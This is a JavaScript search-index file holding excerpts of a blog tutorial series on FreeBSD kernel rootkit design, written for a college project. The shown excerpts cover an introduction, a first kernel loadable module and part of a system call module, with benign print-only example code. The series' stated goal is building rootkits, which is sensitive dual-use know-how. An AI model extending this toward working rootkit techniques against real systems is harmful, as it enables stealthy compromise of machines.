var store = [{
        "title": "FreeBSD Rootkit Design Howtos - Introduction",
        "excerpt":"As the title suggests, this is a howto tutorial on FreeBSD kernel rootkit design. It was prepared as notes as I worked on my college final year project while reading Designing BSD Rootkits: An Introduction to Kernel Hacking, where I got most of the information I needed. I then posted these notes on my blog hoping it could serve as a quick introduction to general kernel hacking. Those notes were filled with unorganized brainstorming and unnecessary technical details that even I myself couldn’t bear reading a page without drinking way too much coffee. It clearly failed it’s purpose.   It took me a year to realize that it’s a shame to give up all that hard work. I rewrote the whole thing to make them more like tutorials other than academic class notes.   I actually wanted to write this howto together with my college final year project synchronously, but sadly things didn’t work out the way I expected. It took me almost a year to reach this point of rewriting most of them to make them more like tutorials other than academic class notes.   Anyway, here I am, writing this intro again, hoping that I can finally finish it this time.   FreeBSD Kernel Rootkit Design and Defense Techniques is the title of my college final year project, I chose this topic because my lecturer who I consulted with thinks this one can help me at applying master degree in malicious software analysis.   I myself have no interest in pursuing master degree in malicious software analysis, but it sure sounds cool to me to create my very own rootkit, especially on my favorite platform, FreeBSD.   I still remember the lecturer asked me why I wanna make it on FreeBSD instead of Linux, well, there are two reasons.      I’m more familiar with FreeBSD than Linux   I don’t see any recent and public accessible rootkit for FreeBSD   Furthermore, there is another secret weapon to make my life even easier, Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong. I highly recommend you guys to grab a copy of this book. It’s good, and it’s the only book on FreeBSD kernel rootkit design as far as I know, so you kinda have no choice here.   There’s another nice book to start with, The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil. As the book name suggests, it can give you a detailed understanding of FreeBSD kernel. Get a copy of this book, read the first few chapters to get a rough understanding and use it as a reference book later on when you work on specific modules of the kernel.   What to Expect   Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong is somehow sufficient for lots of people to kickstart their own rootkit, but you have to be familiar with modern system kernels and have some experiences in working in C.   However, I find this book a little bit rushy, what the author did was to drag you through lots of kernel terminologies and then give you lots of code snippets that, I myself at least, couldn’t understand until I read them for multiple times.   The Design and Implementation of the FreeBSD Operating System By Marshall Kirk McKusick and George V. Neville-Neil on the other hand, discusses overall FreeBSD kernel implementation and as well as each major kernel modules in detail, but the only drawback is that it doesn’t talk much about rootkit techniques, it only concentrates on normal kernel development.   So that’s why I wrote this series on FreeBSD Kernel Rootkit Design, it combines what I have learned, and what I think is useful from all those books and online resources. I also improved some of the examples from Joseph Kong’s book, filled in all related information which were omitted by the author.   Consider this as a tutorial series. If you are looking for a quick and comprehensive from novice to advanced novice guide on writing FreeBSD Kernel Rookits, then congratulations, this is just right for you.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-introduction/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module",
        "excerpt":"Needless to say that the first thing you need to start FreeBSD kernel rootkit development is a FreeBSD box. There are plenty of installation guides on the Internet about FreeBSD installation, so that I’ll just skip this part for the sake of simplicity.   And FYI, basically you are free to choose any hardware to run FreeBSD as long as it’s supported. You can even install your FreeBSD as a virtual machine. 5GB hard drive, at least 256MB memory with any modern CPU will do.   The Environment   The version of FreeBSD I’m going to use throughout this howtos is FreeBSD 9 Stable, it is recommended that you install at least FreeBSD 9 Release although I believe code examples in this howtos are able to run on most of versions after FreeBSD 6.2   myBSD# uname -a FreeBSD myBSD 9.0-STABLE FreeBSD 9.0-STABLE #0: Thu Mar  8 14:16:25 CST 2012 bestwc@myBSD:/usr/obj/usr/src/sys/GENERIC  amd64   Package Installation   You’ll need the FreeBSD source tree to compile your kernel rootkit, be sure to install it because it is not included in minimal installation. You can do this by two ways, the first is to enable src distribution option during installation, and the recommended way is to perform the following command after the installation.   myBSD# cp /usr/share/examples/cvsup/stable-supfile /root &amp;&amp; cd /root myBSD# ee stable-supfile ================================= *default host=CHANGE_THIS.FreeBSD.org ###Change this line *default host=cvsup.FreeBSD.org ###To this ================================= myBSD# csup -g -L2 stable-supfile   This will sync the source tree on your local file system to the latest one from remote repository, and this will simply download the latest for you if you don’t already have the source tree. It is recommended to run the cusp command shown above to frequently update your source tree, for this will make sure your are developing rootkit with the newest kernel source code, and potentially make it more compatible with new FreeBSD releases.   To examine if you have the src tree on your local box, type the following command:   myBSD# ls /usr/src COPYRIGHT       ObsoleteFiles.inc       crypto          lib         share LOCKS           README      etc         libexec         sys MAINTAINERS     UPDATING    games       release         tools Makefile        bin         gnu         rescue          usr.bin Makefile.inc1   cddl        include     sbin            usr.sbin Makefile.mips   contrib     kerberos5   secure   The Dynamic Kernel Linker (KLD)   The Dynamic Kernel Linker (KLD) is a facility in FreeBSD that allows users to interact with the system kernel by dynamically loading or unloading kernel modules. It may sounds strange to you, but believe it or not that you have utilized KLD multiple times during daily operations on your FreeBSD box. The KLD gets called every time you plug in or plug out a device, or by manually typing kldload or kldunload commands. It is especially useful to device driver developers as they can dynamically load their drivers as kernel module and test the functionalities on the fly without rebooting the system. For more information on the KLD, please refer to the FreeBSD Handbook.   The KLD provides a high way for us to put our code into the running kernel space without recompiling as long as we have the required privilege. So that, if we have our kernel rootkit compiled as loadable kernel module, then we’ll theoretically be able to load that module in any FreeBSD machines on the fly.   Although the KLD interface is not the only way for people to interact with kernel, but is undoubtedly the easiest and probably the fastest way to do that. The only question is, will there be any compatibility issues if we stick to KLD interface?      In FreeBSD 3.0, substantial changes were made to the kernel module subsystem, and the LKM Facility was renamed the Dynamic Kernel Linker (KLD) Facility. Subsequently, the term KLD is commonly used to describe LKMs under FreeBSD.    According to the quote above from Designing BSD Rootkits: An Introduction to Kernel Hacking by Joseph Kong, the KLD interface hasn’t been changed since FreeBSD 3.0, which means our yet-to-be-done rootkit should be able to run on any (not always true) modern FreeBSD systems without any (not always true as well) modification.   Just in case that you haven’t realized, we are going to use KLD interfaces a lot in this tutorial. Now let’s get to know the KLD interface more.   The Module Event Handler   When you load or unload any kernel modules to or from the current running kernel, the KLD interface will perform some pre-defined routines to prepare the system. This is called the Module Event Handler, it should be present in every(!) kernel module to handle the initialization and shutdown processes. This handler gets called every time when the code enters or exits kernel space.   (!) Just keep in mind that this isn’t always true, as what the quote says below from Designing BSD Rootkits: An Introduction to Kernel Hacking      Actually, this isn’t entirely true. You can have a KLD that just includes a sysctl. You can also dispense with module handlers if you wish and just use SYSINIT and SYSUNINIT directly to register functions to be invoked on load and unload, respectively. You can’t, however, indicate failure in those.    The prototype of the module event handler is defined in sys/module.h and it is called modeventhand_t   FILE:/usr/src/sys/sys/module.h  myBSD# cat /usr/src/sys/sys/module.h | grep modeventhand_t typedef int (*modeventhand_t)(module_t, int /* modeventtype_t */, void *);   And module_t is a pointer to the module’s struct as defined in the same file.   FILE:/usr/src/sys/sys/module.h  typedef struct module *module_t;   The modeventtype_t on the other hand is an enumerated type of event types defined in the same file as well.   FILE:/usr/src/sys/sys/module.h  typedef enum modeventtype {         MOD_LOAD,    /* Set when module is loaded. */         MOD_UNLOAD,    /* Set when module is unloaded. */         MOD_SHUTDOWN,    /* Set on shutdown. */         MOD_QUIESCE    /* Set on quiesce. */ } modeventtype_t;   With all these information, we can now try to define a simple module event handler. Here is a simple event handler function called load, which displays Hello, world! when it’s loaded, and print Good-bye, cruel world! when it’s unloaded.   static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch (cmd) {     case MOD_LOAD:         uprintf(\"Hello, world!\\n\");         break;      case MOD_UNLOAD:         uprintf(\"Good-bye, cruel world!\\n\");         break;      default:         error = EOPNOTSUPP; //EOPNOTSUPP stands for Error: Operation not supported.         break;     }      return(error); }   It’s perfectly safe if this code doesn’t make much sense to you, as we will get back later. However, what you do need to understand is the prototype of defining a module event handler.   This code snippet should present in your first loadable kernel module, and perform pre-defined routines according to the cmd sent by the kernel accordingly.   Consider this to be a protocol between your module and the kernel, which basically says “Oh the user asked you to unload me? Hold on and let me check my event handler, alright, I’ll print Good-bye, cruel world! and then go away.”   The DECLARE_MODULE Macro   It’s time to get back to our module declaration.   We now know module_t is a pointer to the module structure, but what on earth is a module and how do we define it? The thing is, we must let KLD know the basic information about our module, and it should register itself with kernel when it loads. This process can be awfully long and complicated, lucky that we have a pre-defined macro in sys/module.h that just does this to help us.   FILE:/usr/src/sys/sys/module.h #define DECLARE_MODULE_WITH_MAXVER(name, data, sub, order, maxver) #define DECLARE_MODULE(name, data, sub, order)  * The module declared with DECLARE_MODULE_TIED can only be loaded #define DECLARE_MODULE_TIED(name, data, sub, order)   As shown above, there are actually tree macros for us to declare a module, DECLARE_MODULE, DECLARE_MODULE_TIED, and DECLARE_MODULE_WITH_MAXVER.      DECLARE_MODULE            The simplest one that requires only four parameters to be passed, for normal purposes           DECLARE_MODULE_TIED            Use this macro when your kernel module can only be loaded into the kernel with exactly the same FreeBSD_version           DECLARE_MODULE_WITH_MAXVER            To declare kernel modules that can only run on machines with FreeBSD version maxver or lower           We’ll stick with the general DECLARE_MODULE macro, and now let’s discuss it’s four parameters: name, data, sub, and order.   name      This specifies the generic module name, which is passed as a character string.    data      This parameter specifies the official module name and event handler function, which is passed as a moduledata structure.    The moduledata structure is defined in sys/module.h   FILE:/usr/src/sys/sys/module.h typedef struct moduledata {         const char      *name;          /* module name */         modeventhand_t  evhand;         /* event handler */         void            *priv;          /* extra data */ } moduledata_t;   sub      This specifies the system startup interface namely sysinit_sui_id, which identifies the module type.    We can find a complete list of sysinit_sub_id from sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_sub_id {         SI_SUB_DUMMY            = 0x0000000,    /* not executed; for linker*/         SI_SUB_DONE             = 0x0000001,    /* processed*/         SI_SUB_TUNABLES         = 0x0700000,    /* establish tunable values */         SI_SUB_COPYRIGHT        = 0x0800001,    /* first use of console*/         SI_SUB_SETTINGS         = 0x0880000,    /* check and recheck settings */         SI_SUB_MTX_POOL_STATIC  = 0x0900000,    /* static mutex pool */         SI_SUB_LOCKMGR          = 0x0980000,    /* lockmgr locks */         SI_SUB_VM               = 0x1000000,    /* virtual memory system init*/         SI_SUB_KMEM             = 0x1800000,    /* kernel memory*/         SI_SUB_KVM_RSRC         = 0x1A00000,    /* kvm operational limits*/         SI_SUB_WITNESS          = 0x1A80000,    /* witness initialization */         SI_SUB_MTX_POOL_DYNAMIC = 0x1AC0000,    /* dynamic mutex pool */         SI_SUB_LOCK             = 0x1B00000,    /* various locks */         SI_SUB_EVENTHANDLER     = 0x1C00000,    /* eventhandler init */         SI_SUB_VNET_PRELINK     = 0x1E00000,    /* vnet init before modules */         SI_SUB_KLD              = 0x2000000,    /* KLD and module setup */         SI_SUB_CPU              = 0x2100000,    /* CPU resource(s)*/         SI_SUB_RACCT            = 0x2110000,    /* resource accounting */         SI_SUB_RANDOM           = 0x2120000,    /* random number generator */         SI_SUB_KDTRACE          = 0x2140000,    /* Kernel dtrace hooks */         SI_SUB_MAC              = 0x2180000,    /* TrustedBSD MAC subsystem */         SI_SUB_MAC_POLICY       = 0x21C0000,    /* TrustedBSD MAC policies */         SI_SUB_MAC_LATE         = 0x21D0000,    /* TrustedBSD MAC subsystem */         SI_SUB_VNET             = 0x21E0000,    /* vnet 0 */         SI_SUB_INTRINSIC        = 0x2200000,    /* proc 0*/         SI_SUB_VM_CONF          = 0x2300000,    /* config VM, set limits*/         SI_SUB_DDB_SERVICES     = 0x2380000,    /* capture, scripting, etc. */         SI_SUB_RUN_QUEUE        = 0x2400000,    /* set up run queue*/         SI_SUB_KTRACE           = 0x2480000,    /* ktrace */         SI_SUB_OPENSOLARIS      = 0x2490000,    /* OpenSolaris compatibility */         SI_SUB_CYCLIC           = 0x24A0000,    /* Cyclic timers */         SI_SUB_AUDIT            = 0x24C0000,    /* audit */         SI_SUB_CREATE_INIT      = 0x2500000,    /* create init process*/         SI_SUB_SCHED_IDLE       = 0x2600000,    /* required idle procs */         SI_SUB_MBUF             = 0x2700000,    /* mbuf subsystem */         SI_SUB_INTR             = 0x2800000,    /* interrupt threads */         SI_SUB_SOFTINTR         = 0x2800001,    /* start soft interrupt thread */         SI_SUB_ACL              = 0x2900000,    /* start for filesystem ACLs */         SI_SUB_DEVFS            = 0x2F00000,    /* devfs ready for devices */         SI_SUB_INIT_IF          = 0x3000000,    /* prep for net interfaces */         SI_SUB_NETGRAPH         = 0x3010000,    /* Let Netgraph initialize */         SI_SUB_DTRACE           = 0x3020000,    /* DTrace subsystem */         SI_SUB_DTRACE_PROVIDER  = 0x3048000,    /* DTrace providers */         SI_SUB_DTRACE_ANON      = 0x308C000,    /* DTrace anon enabling */         SI_SUB_DRIVERS          = 0x3100000,    /* Let Drivers initialize */         SI_SUB_CONFIGURE        = 0x3800000,    /* Configure devices */         SI_SUB_VFS              = 0x4000000,    /* virtual filesystem*/         SI_SUB_CLOCKS           = 0x4800000,    /* real time and stat clocks*/         SI_SUB_CLIST            = 0x5800000,    /* clists*/         SI_SUB_SYSV_SHM         = 0x6400000,    /* System V shared memory*/         SI_SUB_SYSV_SEM         = 0x6800000,    /* System V semaphores*/         SI_SUB_SYSV_MSG         = 0x6C00000,    /* System V message queues*/         SI_SUB_P1003_1B         = 0x6E00000,    /* P1003.1B realtime */         SI_SUB_PSEUDO           = 0x7000000,    /* pseudo devices*/         SI_SUB_EXEC             = 0x7400000,    /* execve() handlers */         SI_SUB_PROTO_BEGIN      = 0x8000000,    /* XXX: set splimp (kludge)*/         SI_SUB_PROTO_IF         = 0x8400000,    /* interfaces*/         SI_SUB_PROTO_DOMAININIT = 0x8600000,    /* domain registration system */         SI_SUB_PROTO_DOMAIN     = 0x8800000,    /* domains (address families?)*/         SI_SUB_PROTO_IFATTACHDOMAIN     = 0x8800001,    /* domain dependent data init*/         SI_SUB_PROTO_END        = 0x8ffffff,    /* XXX: set splx (kludge)*/         SI_SUB_KPROF            = 0x9000000,    /* kernel profiling*/         SI_SUB_KICK_SCHEDULER   = 0xa000000,    /* start the timeout events*/         SI_SUB_INT_CONFIG_HOOKS = 0xa800000,    /* Interrupts enabled config */         SI_SUB_ROOT_CONF        = 0xb000000,    /* Find root devices */         SI_SUB_DUMP_CONF        = 0xb200000,    /* Find dump devices */         SI_SUB_RAID             = 0xb380000,    /* Configure GEOM classes */         SI_SUB_SWAP             = 0xc000000,    /* swap */         SI_SUB_INTRINSIC_POST   = 0xd000000,    /* proc 0 cleanup*/         SI_SUB_SYSCALLS         = 0xd800000,    /* register system calls */         SI_SUB_VNET_DONE        = 0xdc00000,    /* vnet registration complete */         SI_SUB_KTHREAD_INIT     = 0xe000000,    /* init process*/         SI_SUB_KTHREAD_PAGE     = 0xe400000,    /* pageout daemon*/         SI_SUB_KTHREAD_VM       = 0xe800000,    /* vm daemon*/         SI_SUB_KTHREAD_BUF      = 0xea00000,    /* buffer daemon*/         SI_SUB_KTHREAD_UPDATE   = 0xec00000,    /* update daemon*/         SI_SUB_KTHREAD_IDLE     = 0xee00000,    /* idle procs*/         SI_SUB_SMP              = 0xf000000,    /* start the APs*/         SI_SUB_RACCTD           = 0xf100000,    /* start raccd*/         SI_SUB_RUN_SCHEDULER    = 0xfffffff     /* scheduler*/ };   sysinit_sub_id is a list of pre-defined enumerated constant data to declare kernel modules for different purposes. We’ll use SI_SUB_DRIVERS in our first few examples, and some other useful subs are to be introduced in later chapters.   order      This specifies the KLD’s order of initialization within the subsystem, namely the sysinit_elem_order.    A complete list of sysinit_elem_order can be found in sys/kernel.h   FILE:/usr/src/sys/sys/kernel.h enum sysinit_elem_order {         SI_ORDER_FIRST          = 0x0000000,    /* first*/         SI_ORDER_SECOND         = 0x0000001,    /* second*/         SI_ORDER_THIRD          = 0x0000002,    /* third*/         SI_ORDER_FOURTH         = 0x0000003,    /* fourth*/         SI_ORDER_MIDDLE         = 0x1000000,    /* somewhere in the middle */         SI_ORDER_ANY            = 0xfffffff     /* last*/ };   For the sake of simplicity and to concentrate on our purpose, we’ll stick to SI_ORDER_MIDDLE which declares our kernel module somewhere in the middle of the KLD subsystem. We will discuss the others if we need to.   Summary   We’ve talked lots of concepts and kernel terminology, probably too much for a beginner. So just before we go for example code, let’s try to quickly review what we have discussed first.           KLD is the way how we interact our code with FreeBSD kernel            Every KLD module (At least in our case) needs a module event handler called modeventhand_t and it is defined in sys/module.h                       The prototype of modeventhand_t requires module_t and modeventtype_t                        module_t is a pointer to our yet-to-be-declared module. We use DECLARE_MODULE to declare general kernel modules                        The DECLARE_MODULE is defined in sys/module.h and it requires four parameters: name, data, sub, and order                                   name is the general name for the module                                    data is passed as moduledata consists of the official name of the module and the event handler of the module. It is defined in sys/module.h                                    sub is the identifier of the type of the module. It is listed in sysinit_sub_id enum defined in sys/kernel.h                                    order is the initialization position of the module. It is listed in sysinitelemorder enum defined in sys/kernel.h                                            Finally we need modeventtype_t to complete modeventhand_t prototype                        modeventtype_t is an enum types of events defined in sys/module.h to let the kernel module perform corresponding actions when certain event happens                   Here are two figures for you to get an overall understanding of how this works.         Example Code   So, after all these pains and hair-pulling, we are finally gonna have our first kernel loadable module compiled.   /*  * FILE: /root/rootkit/1.1/first_module.c  * Example 1.1  * The First Kernel Loadable Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/param.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt;  /* Define a loader function */ static int module_loader(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd)     {         case MOD_LOAD:             uprintf(\"Lets Rock the Kernel!\\n\");             break;          case MOD_UNLOAD:             uprintf(\"Time to Leave the Party!\\n\");             break;          default:             error=EOPNOTSUPP; //Operation not supported             break;     }     return (error); }  /* Define a module data structure */ static moduledata_t module_data = {     \"first_mlodule\",    // Module name     module_loader,      // Event Handler     NULL                // Extra Data };  /* Declare the module */ DECLARE_MODULE(first_mlodule, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);   Now there’s just one more thing left before we can compile the code, the makefile. If you are not familiar with the concept of makeifle, please google it and get yourself familiar with its basic syntax, just a little bit by now.   Here’s the content of makefile   KMOD=   first_module SRCS=   first_module.c  .include &lt;bsd.kmod.mk&gt;   Save it as makefile in the same folder with first_module.c   As you can see, we use bsd.kmod.mk macro here to make our life easier, because otherwise we’ll have to link all kernel source files manually.   All we have to do here is to fill in the module name and source file name. With the makefile and the source file with us, we can now go ahead and compile our first kernel module by entering make in the same folder.   myBSD# make Warning: Object directory not changed from original /root/rootkit/1.1 cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions  -Wmissing-include-dirs -fdiagnostics-show-option   -c first_module.c ld  -d -warn-common -r -d -o first_module.ko first_module.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk first_module.ko  export_syms | xargs -J% objcopy % first_module.ko objcopy --strip-debug first_module.ko   Looks everything is nice and clean, we now have our first module successfully compiled. Now go ahead and treat yourself a muffin.   Let’s take a look at what we have now.   myBSD# ls @       export_syms first_module.c  first_module.ko first_module.o  machine     makefile    x86   We have several files and linkers added here, but hello.ko is what we really care about. That is the result of all our hard work — the loadable module.   It’s like an executable file, same as the file you get in regular application programing, and yes, it is distributable.   Just before you bite that muffin, let’s have our fun first by loading and unloading it.   myBSD# kldload ./first_module.ko Lets Rock the Kernel! myBSD# kldunload first_module.ko Time to Leave the Party! myBSD#   Sweet huh? All of your hard works have been paid by seeing these silly but pretty words printing on your screen.  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-1-kld-first-kernel-loadable-module/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 2 - System Call First Kernel Service Module",
        "excerpt":"So, this is the second tutorial on FreeBSD Kernel Rootkit Design. I hope you have worked through the previous one before you continue, which is obviously a prerequisite.   What we’ve discussed are that KLD is the way we interact with kernel, and how to declare a module by having module name, module data (consists of official name and event handler function), sub, and order. And we agree on the not-completely-true assumption that every kernel module should have an event handler function which deals with event type such as MOD_LOAD, MOD_UNLOAD, and so on. If any of these terms sounds strange to you, I encourage you to go back and review FreeBSD Kernel Rootkit Design Howtos - 1 - KLD First Kernel Loadable Module   The System Call Module   Today we’re gonna talk about the system call module, which is a little bit different compared to the general module we’ve discussed previously.   A general module which we’ve talked about in the last session performs programmed actions only when certain actions take place, such as when it loads, unloads, shutdown, and etc.   A system call module on the other hand, is basically as same as the general KLD module, except that it installs itself as a kernel service request, and then listen to certain signals to perform programmed actions accordingly.   Such functions can be considered as kinda of a bridge between the kernel space and the user space, which enables the ability for its users to send signals to the kernel and make it react accordingly.   What makes this system call module different is that, instead of printing messages every time we load or unload the module, we’re gonna make it print messages every time we send command to it.   Here in this session, we’re gonna talk about the system call module, its structure, its declaration routine, and finally write our first system call module along with a tiny client application to send command to it.   The System Call Function   A system call function is a function defined in the system call module, which contains a list of actions to be taken every time it receives a system call.   It’s similar to the module event handler except that we have control over what command to receive and what actions to perform.   The prototype of system call function is defined in sys/sysent.h and is shown below.   FILE:/usr/src/sys/sys/sysent.h  typedef int     sy_call_t(struct thread *, void *);   The struct struct thread * points to the current running thread, which you don’t have to care about it at this stage. The void * points to the structure of system call’s arguments.   Compare to the general KLD module, the system call module can receive multiple arguments instead of limited and pre-defined ones. So it is your responsibility to define the arguments that the system call module needs to deal with.   Since the system call’s arguments are wrapped in a struct, so we can define it like this:   struct sc_example_args {     char *str; };   Having the system call’s arguments struct successfully defined, we can now declare our system call function like this:   static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }   The first line is obvious the declaration of the system call function, note that we can receive all arguments via void *syscall_args inside the function.   Let’s now take a look at what happens inside the function, we firstly initialized (It’s not the precise term, but it helps) a local variable *uap using our defined sc_example_args structure.   And then convert the incoming arguments from *syscall_args to match our standard, the sc_examples_args structure, and let the *uap pointer points to it. The simple version of this, is we receive arguments from *syscall_args and save it in *uap with the sc_example_args format.   Now we can do whatever we want with the arguments received, such as print out the string like this:  printf(\"%s\\n\", uap-&gt;str);   Looks we have successfully declared a system call function, but we actually just made a huge mistake.   What I mean by mistake is that the code can still be compiled and executed, but we did it in a very bad manner. You see that modern operating systems segregate it’s memory areas into user space and kernel space, code running in each section don’t directly access each other’s resources. The way we assign a user space structure pointer to a kernel space local variable (uap = (struct sc_example_args *)syscall_args;) is unsafe and not recommended.   Here’s a quote from Designing BSD Rootkits: An Introduction to Kernel Hacking that explains a little bit about kernel space and user space.      FreeBSD segregates its virtual memory into two parts: user space and kernel space. User space is where all user-mode applications run, while kernel space is where the kernel and kernel extensions (i.e., LKMs) run. Code running in user space cannot access kernel space directly (but code running in kernel space can access user space). To access kernel space from user space, an application issues a system call.    Let’s move on for now and get back to kernel/user space transition in details later.   The sysent Structure   Still remember the general module declaration macro in the previous session? Well the system call modules need to register themselves by calling a macro as well, but we have to define a sysent structure first and then pass it to the declaration macro.   The sysent structure is similar to the moduledata that we’ve discussed in the last session, it contains the basic information about the system call. So that once we register a system call module with sysent structure, the operating system will know where and how to quickly fire it.   The FreeBSD system actually maintains a table of sysent structures of all system call modules that are currently loaded in the running kernel, thus every system call module has to provide its sysent structure during initialization to register itself with the sysent table.   So be sure that you understand how sysent structure differs from sysent table before we take a look at its definition in sys/sysent.h   FILE:/usr/src/sys/sys/sysent.h  struct sysent {                 /* system call table */         int     sy_narg;        /* number of arguments */         sy_call_t *sy_call;     /* implementing function */         au_event_t sy_auevent;  /* audit event associated with syscall */         systrace_args_func_t sy_systrace_args_func;                                 /* optional argument conversion function. */         u_int32_t sy_entry;     /* DTrace entry ID for systrace. */         u_int32_t sy_return;    /* DTrace return ID for systrace. */         u_int32_t sy_flags;     /* General flags for system calls. */         u_int32_t sy_thrcnt; }; … extern struct sysent sysent[];   I guess the comments in above code explain exactly what you need to know. Note that normally we just need to specify sy_narg and *sy_call for this to work.   Now we can extend our previous example code as following:   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };   The Offset Value   Same as the system call function and the sysent structure, the offset value is another parameter you need to set and pass to the system call module declaration macro. Basically, the offset value is the system call module’s number, which will be used by the system to refer to its sysent structure in the sysent table.   It should be an unique integer, and should be explicitly declared in a system call’s declaration macro. It is considered as a good practice to not to assign fixed numbers to dynamic system call modules. Instead, we can ask the system to dynamically assign an unused offset number for our system call module by doing this:   static int offset = NO_SYSCALL;   NO_SYSCALL is a constant, meaning the next available slots offset in sysent table.   Just in case if you are interested, the value for NO_SYSCALL is -1 as shown below:   FILE:/usr/src/sys/sys/sysent.h  #define NO_SYSCALL (-1)   Some of the pre-defined system call offsets are listed in the /sys/kern/syscalls.master file, here’s some allocations:                  Offset Range       Comment                       0-150       Reserved/unimplemented system calls. For use in future Berkeley releases.                 151-180       Reserved for vendor-specific system calls                 181-199       Used by/reserved for BSD                 210-219       Reserved for loadable syscalls                 220-249       Were introduced with NetBSD/4.4Lite-2                 250-299       Initially used in OpenBSD                 300-531       Syscall numbers for FreeBSD           The SYSCALL_MODULE Macro   I said at the beginning of this tutorial that we are gonna need to call a macro to declare a system call module, but we needed to know few other things first. We talked about system call function, we talked about sysent structure and we talked about the offset value.   We need these declared first and only then we can call the SYSCALL_MODULE macro. It is defined in sys/sysent.h as following   FILE:/usr/src/sys/sys/sysent.h  #define SYSCALL_MODULE(name, offset, new_sysent, evh, arg)   Different from the DECLARE_MODULE macro which requires four parameters: name, data, sub, and order, the SYSCALL_MODULE requires five parameter to be passed, which are:   name      This specifies the generic module name, which is passed as a character string.    offset      This specifies the system call’s offset value, which is passed as an integer pointer.    new_sysent      This specifies the completed sysent structure, which is passed as a struct sysent pointer.    evh      This specifies the event handler function.    arg      This specifies the arguments to be passed to the event handler function. For our purposes, we’ll always set this parameter to NULL.    Great, we can now further extend our previous example code as following   struct sc_example_args {     char *str; };  static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;     printf(\"%s\\n\", uap-&gt;str);     return(0); }  static struct sysent sc_example_sysent = {     1,              /* number of arguments */     sc_example      /* implementing function */ };  static int offset = NO_SYSCALL;  SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, evh, NULL);   Don’t worry about the event handler function evh, it will be exactly same as general module’s event handler function. You’ll see that in the complete example soon, for now let’s sum things up first.   Summary           System Call Module is another type of kernel loadable module            It installs itself in the kernel space and perform programmed activities according to signals received from user space            In order to declare a system call module, five parameters are required, name, offset, new_sysent, evh, and arg                       name is the general module name                        offset is the system call module’s offset number                      It determines where to store the system call module’s sysent structure in sysent[] table                                new_sysent is a pointer to the system call module’s sysent structure                                   sysent structure is similar to moduledata                                    It contains basic information about the system call module including                                               Number of arguments it expects                                                And implementing function                                                                The implementation function, also known as the system call function                                    It contains a list of actions to be taken every time it receives a particular signal                                       Example Code   We can now write the our first system call module, take a look at the following code, there are some comments there to help you understand. There is absolutely nothing new except the event handler function, which in fact, isn’t new to us as well.   /*  * FILE: /root/rootkit/2.1/sc_example.c  * Example 2.1  * The First System Call Module  * FreeBSD Rootkit Design Howtos @ hailang.im */ #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; #include &lt;sys/systm.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ struct sc_example_args {     char *str; };  /* The system call function. */ static int sc_example(struct thread *td, void *syscall_args) {     struct sc_example_args *uap;     uap = (struct sc_example_args *)syscall_args;      printf(\"%s\\n\",uap-&gt;str);      return (0); }  /* The sysent for the new system call */ static struct sysent sc_example_sysent = {     1,          /* number of arguments */     sc_example  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error = 0;      switch(cmd) {     case MOD_LOAD:         uprintf(\"System call loaded at offset %d.\\n\", offset);         break;     case MOD_UNLOAD:         uprintf(\"System call unloaded from offset %d.\\n\", offset);         break;     default:         error = EOPNOTSUPP;         break;     }      return(error); }  /* Declare the System Call Module */ SYSCALL_MODULE(sc_example, &amp;offset, &amp;sc_example_sysent, load, NULL);   As usual, we need to have a makefile in the same directory as the source code file.   KMOD=   sc_example SRCS=   sc_example.c  .include &lt;bsd.kmod.mk&gt;   Now build your first system call module by using the make command in the same directory.   myBSD# make Warning: Object directory not changed from original /root/rootkit/2.1 @ -&gt; /usr/src/sys machine -&gt; /usr/src/sys/amd64/include x86 -&gt; /usr/src/sys/x86/include cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mno-sse -mcmodel=kernel -mno-red-zone -mno-mmx -msoft-float  -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector 